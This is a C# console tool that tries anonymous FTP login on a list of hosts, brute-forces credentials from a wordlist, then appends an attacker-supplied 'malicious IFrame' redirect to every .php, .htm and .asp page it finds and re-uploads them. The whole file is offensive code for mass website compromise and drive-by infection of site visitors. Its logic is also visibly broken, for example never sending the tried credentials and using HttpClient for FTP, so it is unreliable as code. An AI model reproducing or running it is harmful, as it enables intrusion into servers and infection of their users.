// See https://aka.ms/new-console-template for more information
using System.Net;
using System.Net.Http.Headers;
await FTPClient.Main(args);
class FTPClient
{
    public static bool AnonLogin(string host)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = client.GetAsync($"ftp://{host}").Result;

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine($"\n[+] {host} FTP Anonymous login succeeded");
                    return true;
                }
            }
        }
        catch (HttpRequestException e)
        {
            Console.WriteLine($"\n[-] {host} FTP Anonymous login failed: {e.Message}");
        }

        return false;
    }
   public static async Task<Tuple<string, string>> BruteLogin(string host, string wordlistPath)
    {
        try
        {
            using (StreamReader reader = new StreamReader(wordlistPath))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    string[] credentials = line.Split(":");
                    string uname = credentials[0];
                    string pw = credentials[1];

                    Console.WriteLine($"[*] Trying {uname} and {pw}");
                    try
                    {
                        using (HttpClient client = new HttpClient())
                        {
                            HttpResponseMessage response = await client.GetAsync($"ftp://{host}");

                            if (response.IsSuccessStatusCode)
                            {
                                Console.WriteLine($"\n[+] {host} FTP login succeeded with username = {uname} and password = {pw}");
                                return Tuple.Create(uname, pw);
                            }
                        }
                    }
                    catch (HttpRequestException)
                    {
                        // Continue to the next iteration to try the next username and password
                    }
                }
            }
        }
        catch (Exception)
        {
            Console.WriteLine("[-] Error with the wordlist. The format needs to be username:password");
        }

        Console.WriteLine("[-] Could not brute force FTP credentials");
        return Tuple.Create<string, string>(null, null);
    }
    public static async Task Attack(string uname, string pw, string host, string redirect)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                // Set credentials for FTP authentication
                var credentials = new NetworkCredential(uname, pw);
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes($"{credentials.UserName}:{credentials.Password}")));

                // Retrieve the list of default pages
                string[] dir = await ReturnDefault(host);

                if (dir != null)
                {
                    Console.WriteLine("[*] Trying to inject all pages with IFrame");
                    foreach (string page in dir)
                    {
                        // Retrieve the content of the page
                        string content = await GetPageContent(client, host, page);

                        // Modify and upload the page
                        if (content != null)
                        {
                            content += redirect;
                            await UploadPageContent(client, host, page, content);
                            Console.WriteLine($"[+] Injected Malicious IFrame on: {page}");
                            Console.WriteLine($"[+] Uploaded Injected Page: {page}");
                        }
                    }
                }
            }
        }
        catch (HttpRequestException)
        {
            Console.WriteLine("[-] Failed to connect to the FTP server. Check credentials or server availability.");
        }
    }

    private static async Task<string[]> ReturnDefault(string host)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync($"ftp://{host}");
                if (response.IsSuccessStatusCode)
                {
                    string content = await response.Content.ReadAsStringAsync();
                    string[] dir = content.Split('\n', StringSplitOptions.RemoveEmptyEntries);
                    if (dir == null)
                    {
                        dir = new string[0];
                    }

                    string[] results = new string[0];
                    foreach (string file in dir)
                    {
                        string fn = file.ToLower();
                        if (fn.Contains(".php") || fn.Contains(".htm") || fn.Contains(".asp"))
                        {
                            Console.WriteLine($"[+] Found default page: {file}");
                            Array.Resize(ref results, results.Length + 1);
                            results[results.Length - 1] = fn;
                        }
                    }

                    return results;
                }
            }
        }
        catch (HttpRequestException)
        {
            Console.WriteLine("[-] Could not list directory contents");
            Console.WriteLine("[-] Skipping To Next Target.");
        }

        return null;
    }

    private static async Task<string> GetPageContent(HttpClient client, string host, string page)
    {
        try
        {
            HttpResponseMessage response = await client.GetAsync($"ftp://{host}/{page}");
            if (response.IsSuccessStatusCode)
            {
                return await response.Content.ReadAsStringAsync();
            }
            else
            {
                Console.WriteLine($"[-] Failed to retrieve the page {page}. Status code: {response.StatusCode}");
            }
        }
        catch (HttpRequestException)
        {
            Console.WriteLine($"[-] Failed to retrieve the page {page}. Check the FTP connection or permissions.");
        }

        return null;
    }

    private static async Task UploadPageContent(HttpClient client, string host, string page, string content)
    {
        try
        {
            using (HttpContent httpContent = new StringContent(content))
            {
                await client.PutAsync($"ftp://{host}/{page}", httpContent);
            }
        }
        catch (HttpRequestException)
        {
            Console.WriteLine($"[-] Failed to upload the page {page}. Check the FTP connection or permissions.");
        }
    }
    public static async Task InjectPage(string host, string page, string redirect)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync($"ftp://{host}/{page}");

                if (response.IsSuccessStatusCode)
                {
                    Stream responseStream = await response.Content.ReadAsStreamAsync();
                    using (StreamReader reader = new StreamReader(responseStream))
                    {
                        string content = reader.ReadToEnd();
                        content += redirect;

                        // Use HttpClient to upload the modified content
                        using (HttpContent httpContent = new StringContent(content))
                        {
                            await client.PutAsync($"ftp://{host}/{page}", httpContent);
                        }

                        Console.WriteLine($"[+] Injected Malicious IFrame on: {page}");
                        Console.WriteLine($"[+] Uploaded Injected Page: {page}");
                    }
                }
                else
                {
                    Console.WriteLine($"[-] Failed to retrieve the page. Status code: {response.StatusCode}");
                }
            }
        }
        catch (HttpRequestException)
        {
            Console.WriteLine("[-] Failed to inject the page. Check the FTP connection or permissions.");
        }
    }

    public static async Task Main(string[] args)
    {
        Console.WriteLine("HEJ");
        string tgtHost = null;
        string wordlist = null;
        string redirect = null;
        Console.WriteLine("usage: scanner.exe -H <target host[s]> -r <redirect page> [-f <userpass file>]");
        for (int i = 0; i < args.Length; i++){
            switch(args[i])
            {
                case "-H":
                tgtHost = args[++i];
                break;
            case "-f":
                wordlist = args[++i];
                break;
            case "-r":
                redirect = args[++i];
                break;
            default:
                break;
            }
            if (tgtHost == null || redirect == null)
            {
                Console.WriteLine("Please provide the required options: -H, -r");
                return;
            }
            string[] hosts = tgtHost.Split(",");
            foreach (string host in hosts)
            {
                string uname = null;
                string pw = null;

                if(FTPClient.AnonLogin(host))
                {
                    uname = "anonymous";
                    pw = "me@your.com";
                    Console.WriteLine("[+] Using Anonymous Credentials Attack");
                    await FTPClient.Attack(uname, pw, host, redirect);
                }
                else if (wordlist != null)
                {
                    Tuple<string, string> credentials = await FTPClient.BruteLogin(host, wordlist);
                    uname = credentials.Item1;
                    pw = credentials.Item2;
                }
                if (pw != null)
                {
                    Console.WriteLine("[+] Using Credentials: {uname} and {pw} to attack");
                    await FTPClient.Attack(uname, pw, host, redirect);
                }
            }
        }
    }
}
